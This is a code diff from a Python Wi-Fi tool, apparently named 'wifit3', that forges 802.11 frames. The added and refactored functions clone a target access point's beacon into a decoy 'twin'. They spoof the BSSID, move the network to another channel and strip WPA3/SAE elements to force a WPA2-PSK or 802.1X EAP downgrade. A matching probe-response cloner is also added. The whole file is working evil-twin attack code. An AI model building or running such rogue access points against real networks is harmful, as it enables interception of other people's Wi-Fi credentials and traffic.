@@ -8,8 +8,14 @@ import struct
 from typing import Optional
 
 from wifit3.dot11.ie import (
-    GENERIC_RSN_IE, ds_param_ie, ext_rates_ie, force_psk_akm,
-    iter_information_elements, rates_ie,
+    GENERIC_ENTERPRISE_RSN_IE,
+    GENERIC_RSN_IE,
+    ds_param_ie,
+    ext_rates_ie,
+    force_eap_akm,
+    force_psk_akm,
+    iter_information_elements,
+    rates_ie,
 )
 from wifit3.dot11.eapol import data_header, eapol_key, LLC_SNAP_EAPOL
 from wifit3.dot11.mac import mac_header
@@ -89,8 +95,52 @@ def _vht_op_to_20mhz(elem: bytes) -> bytes:
     return elem[:2] + bytes(body)
 
 
-def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] = None) -> bytes:
-    """The target's beacon rewritten to a WPA2-PSK twin. ``bssid`` rewrites Addr2/Addr3."""
+def _ht_op_primary_channel(elem: bytes, channel: int) -> bytes:
+    """HT Operation: update primary channel only, keep secondary-offset / width."""
+    body = bytearray(elem[2:])
+    if len(body) >= 1:
+        body[0] = channel & 0xFF
+    return elem[:2] + bytes(body)
+
+
+def _rewrite_beacon_tags(
+    tags: bytes,
+    decoy_channel: int,
+    *,
+    rewrite_rsn,
+    generic_rsn: bytes,
+    narrow_to_20mhz: bool,
+) -> bytes:
+    kept = bytearray()
+    for tag_id, _body, elem in iter_information_elements(tags):
+        if tag_id == _ELEMID_RSN:
+            kept += rewrite_rsn(elem) or generic_rsn
+        elif tag_id == _ELEMID_DS:
+            kept += ds_param_ie(decoy_channel)
+        elif tag_id == _ELEMID_HT_OP:
+            if narrow_to_20mhz:
+                kept += _ht_op_to_channel(elem, decoy_channel)
+            else:
+                kept += _ht_op_primary_channel(elem, decoy_channel)
+        elif tag_id == _ELEMID_VHT_OP:
+            if narrow_to_20mhz:
+                kept += _vht_op_to_20mhz(elem)
+            else:
+                kept += elem
+        elif tag_id != _ELEMID_RSNXE:
+            kept += elem
+    return bytes(kept)
+
+
+def _beacon_clone(
+    real_beacon: bytes,
+    decoy_channel: int,
+    bssid: Optional[bytes],
+    *,
+    rewrite_rsn,
+    generic_rsn: bytes,
+    narrow_to_20mhz: bool = True,
+) -> bytes:
     if len(real_beacon) < _BEACON_HEAD:
         raise ValueError(f"beacon too short to rewrite: {len(real_beacon)} bytes")
     head = bytearray(real_beacon[:_BEACON_HEAD])
@@ -98,17 +148,60 @@ def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] 
     if bssid is not None:
         head[10:16] = bssid          # Addr2 (SA)
         head[16:22] = bssid          # Addr3 (BSSID)
-    tags = real_beacon[_BEACON_HEAD:]
-    kept = bytearray()
-    for tag_id, _body, elem in iter_information_elements(tags):
-        if tag_id == _ELEMID_RSN:
-            kept += force_psk_akm(elem) or GENERIC_RSN_IE
-        elif tag_id == _ELEMID_DS:
-            kept += ds_param_ie(decoy_channel)
-        elif tag_id == _ELEMID_HT_OP:
-            kept += _ht_op_to_channel(elem, decoy_channel)
-        elif tag_id == _ELEMID_VHT_OP:
-            kept += _vht_op_to_20mhz(elem)
-        elif tag_id != _ELEMID_RSNXE:
-            kept += elem
-    return bytes(head) + bytes(kept)
+    tags = _rewrite_beacon_tags(
+        real_beacon[_BEACON_HEAD:],
+        decoy_channel,
+        rewrite_rsn=rewrite_rsn,
+        generic_rsn=generic_rsn,
+        narrow_to_20mhz=narrow_to_20mhz,
+    )
+    return bytes(head) + tags
+
+
+def beacon_clone(
+    real_beacon: bytes,
+    decoy_channel: int,
+    bssid: Optional[bytes] = None,
+    *,
+    narrow_to_20mhz: bool = True,
+) -> bytes:
+    """The target's beacon rewritten to a WPA2-PSK twin. ``bssid`` rewrites Addr2/Addr3."""
+    return _beacon_clone(
+        real_beacon,
+        decoy_channel,
+        bssid,
+        rewrite_rsn=force_psk_akm,
+        generic_rsn=GENERIC_RSN_IE,
+        narrow_to_20mhz=narrow_to_20mhz,
+    )
+
+
+def beacon_clone_enterprise(
+    real_beacon: bytes,
+    channel: int,
+    bssid: Optional[bytes] = None,
+    *,
+    pmf_capable: bool = False,
+    narrow_to_20mhz: bool = False,
+) -> bytes:
+    """Rewrite the target beacon for an 802.1X lab twin (SAE/RSNXE stripped, EAP AKM)."""
+    def _rewrite_rsn(elem: bytes) -> Optional[bytes]:
+        return force_eap_akm(elem, pmf_capable=pmf_capable)
+
+    return _beacon_clone(
+        real_beacon,
+        channel,
+        bssid,
+        rewrite_rsn=_rewrite_rsn,
+        generic_rsn=GENERIC_ENTERPRISE_RSN_IE,
+        narrow_to_20mhz=narrow_to_20mhz,
+    )
+
+
+def probe_resp_from_beacon(beacon: bytes) -> bytes:
+    """Probe response with the same capability field and IEs as ``beacon`` (RA zeroed)."""
+    if len(beacon) < _BEACON_HEAD:
+        raise ValueError(f"beacon too short for probe clone: {len(beacon)} bytes")
+    bssid = beacon[10:16]
+    hdr = mac_header(b"\x50\x00", b"\x00" * 6, bssid, bssid)
+    return hdr + beacon[24:_BEACON_HEAD] + beacon[_BEACON_HEAD:]
